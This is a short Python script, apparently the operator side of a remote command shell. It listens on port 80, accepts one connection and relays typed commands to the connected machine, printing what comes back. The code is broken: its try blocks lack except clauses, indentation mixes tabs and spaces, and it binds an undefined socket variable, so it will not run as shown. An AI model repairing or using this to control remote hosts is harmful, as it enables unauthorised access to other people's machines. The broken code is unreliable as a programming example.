import socket
import sys
def socket_create():
 try:
  global host
  global port
  global sock
  host = ''
  port = 80
  sock = socket.socket()


def socket_bind():
 try:
	global host
	global port
	global s	
	s.bind((host,port))
	s.listen(5)

def socket_accept():
	conn , address = s.accept()
	send_commands(conn)
	conn.close()


def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'exit':
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(128),"utf-8")
			print(client_response, end=" ")


def main():
	socket_create()
	socket_bind()
	socket_accept()

main()

	
